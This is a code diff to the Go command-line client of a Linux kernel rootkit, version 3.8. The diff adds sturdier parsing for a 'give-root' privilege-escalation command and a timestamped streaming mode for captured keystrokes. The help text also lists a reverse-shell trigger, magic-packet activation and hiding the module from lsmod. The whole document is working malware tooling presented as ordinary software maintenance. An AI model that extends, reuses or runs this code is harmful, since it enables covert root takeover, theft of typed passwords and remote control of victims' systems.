@@ -14,7 +14,14 @@ import (
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.7"
+const clientVersion = "3.8"
+
+// Poll interval contract of `keylog --follow` (milliseconds), mirrored
+// by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
+const (
+	keylogDefaultIntervalMs = 500
+	keylogMinIntervalMs     = 50
+)
 
 const devicePath = "/dev/vault_kernel"
 
@@ -53,6 +60,28 @@ func verifyRootRemote(pid int) bool {
 		}
 	}
 	return false
+}
+
+// parseGiveRootPID validates the optional PID argument of give-root.
+// No argument (or 0) means "self" — the documented kernel contract:
+// IOCTL_GIVE_ROOT with pid <= 0 escalates the CALLER.  A non-numeric
+// argument is a usage error, NOT a silent self-root: the Python CLI
+// (argparse type=int) rejects it and Go must match — before v3.8 the
+// strconv.Atoi error was discarded here and `give-root abc` escalated
+// SELF instead of erroring.  Extracted as a pure function for
+// unit-testing without a device.
+func parseGiveRootPID(args []string) (int, error) {
+	if len(args) == 0 {
+		return 0, nil
+	}
+	if len(args) > 1 {
+		return 0, fmt.Errorf("usage: vault_kernel give-root [pid]")
+	}
+	pid, err := strconv.Atoi(args[0])
+	if err != nil {
+		return 0, fmt.Errorf("invalid PID: %s (numeric PID, or none for self)", args[0])
+	}
+	return pid, nil
 }
 
 func giveRoot(f *os.File, pid int) error {
@@ -208,11 +237,72 @@ func keylogRead(f *os.File) error {
 	return nil
 }
 
+// keylogOpts is the parsed argument set of the `keylog` command.
+type keylogOpts struct {
+	follow     bool
+	timestamps bool
+	intervalMs int
+}
+
+// parseKeylogArgs owns the `keylog` argument grammar:
+//
+//	keylog [--follow [ms]] [--timestamps]
+//
+// The poll interval stays POSITIONAL after --follow (documented contract
+// since v3.5, mirroring the Python CLI's --interval); --timestamps may
+// appear anywhere; --timestamps without --follow is a usage error in
+// BOTH clients.  Extracted as a pure function so the grammar is
+// unit-testable without a device (v3.8 — before, any arg that was not
+// `--follow` was silently ignored in the one-shot path).
+func parseKeylogArgs(args []string) (keylogOpts, error) {
+	opts := keylogOpts{intervalMs: keylogDefaultIntervalMs}
+	seenInterval := false
+	for i := 0; i < len(args); i++ {
+		switch args[i] {
+		case "--follow":
+			opts.follow = true
+		case "--timestamps":
+			opts.timestamps = true
+		default:
+			if !opts.follow || seenInterval {
+				return opts, fmt.Errorf("usage: vault_kernel keylog [--follow [ms]] [--timestamps]")
+			}
+			n, err := strconv.Atoi(args[i])
+			if err != nil || n < keylogMinIntervalMs {
+				return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
+			}
+			opts.intervalMs = n
+			seenInterval = true
+		}
+	}
+	if opts.timestamps && !opts.follow {
+		return opts, fmt.Errorf("--timestamps requires --follow")
+	}
+	return opts, nil
+}
+
+// formatKeylogEvent renders one follow event — mirrors
+// format_keylog_event() in the Python CLI (contract pinned by tests in
+// BOTH clients).  With timestamps every event starts on a fresh line
+// prefixed with the POLL time ([HH:MM:SS]) — the module's buffer
+// carries no per-keystroke time, so the poll time is the honest lower
+// bound.  Without them the historical behaviour is kept: a suffix diff
+// continues the current line and a buffer wrap starts a new one.
+func formatKeylogEvent(newText, ts string, timestamps, wrapped bool) string {
+	if timestamps {
+		return "\n[" + ts + "] " + newText
+	}
+	if wrapped {
+		return "\n" + newText
+	}
+	return newText
+}
+
 // keylogFollow polls KEYLOG_READ and streams new keystrokes as they
 // arrive.  The module's buffer shifts left when full, so a suffix
 // diff is printed when the common prefix breaks (buffer wrap).
 // Exits on Ctrl-C (default SIGINT handling).
-func keylogFollow(f *os.File, intervalMs int) error {
+func keylogFollow(f *os.File, intervalMs int, timestamps bool) error {
 	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
 	prev := ""
 	for {
@@ -222,12 +312,14 @@ func keylogFollow(f *os.File, intervalMs int) error {
 		}
 		cur := strings.TrimRight(string(buf), "\x00")
 		if cur != prev {
+			newText := cur
+			wrapped := false
 			if len(cur) >= len(prev) && strings.HasPrefix(cur, prev) {
-				fmt.Print(cur[len(prev):])
+				newText = cur[len(prev):]
 			} else {
-				// Buffer wrapped: common prefix lost.
-				fmt.Print("\n" + cur)
+				wrapped = true
 			}
+			fmt.Print(formatKeylogEvent(newText, time.Now().Format("15:04:05"), timestamps, wrapped))
 			prev = cur
 		}
 		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
@@ -653,7 +745,8 @@ Commands:
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
-  keylog [--follow [ms]]  Read captured keystrokes (stream with --follow)
+  keylog [--follow [ms]] [--timestamps]
+                          Read captured keystrokes (stream with --follow)
   keylog-clear            Clear keylogger buffer
   hide-module             Hide rootkit from lsmod
   unhide-module           Make rootkit visible in lsmod
@@ -713,9 +806,9 @@ func run() error {
 
 	switch cmd {
 	case "give-root":
-		pid := 0
-		if len(os.Args) > 2 {
-			pid, _ = strconv.Atoi(os.Args[2])
+		pid, err := parseGiveRootPID(os.Args[2:])
+		if err != nil {
+			return err
 		}
 		return giveRoot(f, pid)
 
@@ -818,16 +911,12 @@ func run() error {
 		return nil
 
 	case "keylog":
-		if len(os.Args) > 2 && os.Args[2] == "--follow" {
-			interval := 500
-			if len(os.Args) > 3 {
-				n, err := strconv.Atoi(os.Args[3])
-				if err != nil || n < 50 {
-					return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
-				}
-				interval = n
-			}
-			return keylogFollow(f, interval)
+		opts, err := parseKeylogArgs(os.Args[2:])
+		if err != nil {
+			return err
+		}
+		if opts.follow {
+			return keylogFollow(f, opts.intervalMs, opts.timestamps)
 		}
 		return keylogRead(f)
 
